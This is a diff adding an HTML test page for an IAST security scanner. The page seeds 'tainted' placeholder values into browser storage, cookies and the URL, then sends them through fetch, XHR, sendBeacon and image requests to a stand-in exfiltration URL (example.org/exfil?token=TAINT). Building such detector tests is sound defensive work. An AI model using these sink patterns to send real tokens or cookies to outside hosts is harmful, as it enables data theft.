@@ -1,0 +1,208 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>IAST HTTP Exfiltration Sinks</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 24px; background: #0f172a; color: #e2e8f0; }
+    h1 { margin-top: 0; }
+    .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    .sources { display: grid; gap: 8px; margin-top: 8px; }
+    .sources label { display: flex; gap: 8px; align-items: center; }
+    .sources table { width: 100%; border-collapse: collapse; margin-top: 8px; }
+    .sources td { padding: 4px 6px; border-bottom: 1px solid #1f2937; vertical-align: top; }
+    label { display: block; margin: 8px 0 4px; color: #cbd5e1; }
+    input, textarea, button { width: 100%; border-radius: 10px; border: 1px solid #1f2937; padding: 10px; background: #0b1220; color: #e2e8f0; }
+    input[type="radio"] { width: auto; padding: 0; }
+    textarea { min-height: 90px; }
+    button { cursor: pointer; font-weight: 600; background: #2563eb; border: none; margin-top: 8px; }
+    button:hover { background: #1d4ed8; }
+    .note { color: #94a3b8; font-size: 0.9rem; }
+    .row { display: grid; gap: 8px; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }
+  
+    .back-link {
+      display: inline-block;
+      margin-bottom: 12px;
+      color: #93c5fd;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .back-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <a class="back-link" href="index.html">← Back to index</a>
+  <h1>IAST Client HTTP Exfiltration Module</h1>
+  <p class="note">Exercises fetch/XHR/sendBeacon/image.src sinks with tainted data in URL, headers, or body.</p>
+
+  <div class="card">
+    <label for="url">URL (tainted)</label>
+    <input id="url" type="text" placeholder="https://example.org/exfil">
+    <div class="row">
+      <button id="use-same-origin" type="button">Use same-origin URL</button>
+      <button id="use-cross-origin" type="button">Use cross-origin URL</button>
+    </div>
+    <label for="headers">Headers JSON (tainted)</label>
+    <textarea id="headers" placeholder='{"Authorization": "Bearer TAINT"}'></textarea>
+    <label for="body">Body (tainted)</label>
+    <textarea id="body" placeholder='{"token":"TAINT"}'></textarea>
+    <div class="sources">
+      <div class="note">Choose which source to prime before triggering sinks.</div>
+      <label><input type="radio" name="sourceType" value="query" checked> URL query (?url=...)</label>
+      <label><input type="radio" name="sourceType" value="hash"> URL hash</label>
+      <label><input type="radio" name="sourceType" value="cookie"> document.cookie</label>
+      <label><input type="radio" name="sourceType" value="localStorage"> localStorage</label>
+      <label><input type="radio" name="sourceType" value="sessionStorage"> sessionStorage</label>
+      <label><input type="radio" name="sourceType" value="windowName"> window.name</label>
+      <label><input type="radio" name="sourceType" value="inputOnly"> input only</label>
+      <button id="prime-selected">Prime selected source</button>
+      <button id="prime-all">Prime ALL sources</button>
+      <div id="active-sources"></div>
+    </div>
+    <p class="note">Taint is pulled from ?url=..., ?body=..., or the fields above when you click "Prime taint sources".</p>
+  </div>
+
+  <div class="card">
+    <button id="btn-fetch-url">fetch(url)</button>
+    <button id="btn-fetch-headers" style="margin-top:8px;">fetch(url, { headers })</button>
+    <button id="btn-fetch-body" style="margin-top:8px;">fetch(url, { method: 'POST', body })</button>
+    <button id="btn-xhr" style="margin-top:8px;">XMLHttpRequest.open/send</button>
+    <button id="btn-beacon" style="margin-top:8px;">navigator.sendBeacon(url, body)</button>
+    <button id="btn-image" style="margin-top:8px;">image.src = url</button>
+  </div>
+
+  <script>
+    function getParam(name) {
+      const params = new URLSearchParams(location.search);
+      const hash = location.hash ? decodeURIComponent(location.hash.slice(1)) : '';
+      if (name === 'hash') return hash;
+      return params.get(name) || '';
+    }
+
+    const sources = {
+      inputOnly: { label: 'Input only', value: '' },
+      query: { label: 'URL query ?url', value: null },
+      hash: { label: 'URL hash', value: null },
+      cookie: { label: 'document.cookie "iast_payload"', value: null },
+      localStorage: { label: 'localStorage["iast_payload"]', value: null },
+      sessionStorage: { label: 'sessionStorage["iast_headers"]', value: null },
+      windowName: { label: 'window.name', value: null }
+    };
+
+    function getSelectedSourceType() {
+      const checked = document.querySelector('input[name="sourceType"]:checked');
+      return checked ? checked.value : 'query';
+    }
+
+    function setSourceValue(type, url, headers, body) {
+      if (!sources[type]) return;
+      sources[type].value = url || headers || body || '';
+      switch (type) {
+        case 'query':
+          break;
+        case 'hash':
+          window.location.hash = 'url=' + encodeURIComponent(url || '');
+          break;
+        case 'cookie':
+          if (url) document.cookie = 'iast_payload=' + encodeURIComponent(url) + '; path=/';
+          break;
+        case 'localStorage':
+          if (url) localStorage.setItem('iast_payload', url);
+          break;
+        case 'sessionStorage':
+          if (headers) sessionStorage.setItem('iast_headers', headers);
+          break;
+        case 'windowName':
+          if (body) window.name = body;
+          break;
+        case 'inputOnly':
+        default:
+          break;
+      }
+      renderActiveSources();
+    }
+
+    function primeSelectedSource(url, headers, body) {
+      const type = getSelectedSourceType();
+      setSourceValue(type, url, headers, body);
+    }
+
+    function primeAllSources(url, headers, body) {
+      Object.keys(sources).forEach(type => setSourceValue(type, url, headers, body));
+    }
+
+    function renderActiveSources() {
+      const rows = Object.keys(sources).map(type => {
+        const { label, value } = sources[type];
+        const display = value == null || value === ''
+          ? '<em>(empty)</em>'
+          : '<code>' + String(value).replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</code>';
+        return '<tr><td style="width: 35%;"><strong>' + label + '</strong></td><td>' + display + '</td></tr>';
+      });
+      document.getElementById('active-sources').innerHTML =
+        '<h3>Active sources</h3><table><tbody>' + rows.join('') + '</tbody></table>';
+    }
+
+    const urlField = document.getElementById('url');
+    const headersField = document.getElementById('headers');
+    const bodyField = document.getElementById('body');
+
+    urlField.value = getParam('url') || "https://example.org/exfil?token=TAINT";
+    headersField.value = getParam('headers') || '{"Authorization":"Bearer TAINT"}';
+    bodyField.value = getParam('body') || '{"token":"TAINT"}';
+
+    document.getElementById('use-same-origin').onclick = () => {
+      urlField.value = location.origin + '/iast-probe';
+    };
+
+    document.getElementById('use-cross-origin').onclick = () => {
+      urlField.value = 'https://example.org/exfil?token=TAINT';
+    };
+
+    document.getElementById('prime-selected').onclick = () => {
+      primeSelectedSource(urlField.value, headersField.value, bodyField.value);
+      alert('Selected source primed.');
+    };
+
+    document.getElementById('prime-all').onclick = () => {
+      primeAllSources(urlField.value, headersField.value, bodyField.value);
+      alert('All sources primed.');
+    };
+
+    document.getElementById('btn-fetch-url').onclick = () => {
+      fetch(urlField.value).catch(() => {});
+    };
+
+    document.getElementById('btn-fetch-headers').onclick = () => {
+      let hdrs = {};
+      try { hdrs = JSON.parse(headersField.value || '{}'); } catch (_) {}
+      fetch(urlField.value, { headers: hdrs }).catch(() => {});
+    };
+
+    document.getElementById('btn-fetch-body').onclick = () => {
+      fetch(urlField.value, { method: 'POST', body: bodyField.value }).catch(() => {});
+    };
+
+    document.getElementById('btn-xhr').onclick = () => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', urlField.value);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(bodyField.value);
+    };
+
+    document.getElementById('btn-beacon').onclick = () => {
+      navigator.sendBeacon(urlField.value, bodyField.value);
+    };
+
+    document.getElementById('btn-image').onclick = () => {
+      const img = new Image();
+      img.src = urlField.value;
+    };
+
+    renderActiveSources();
+  </script>
+</body>
+</html>
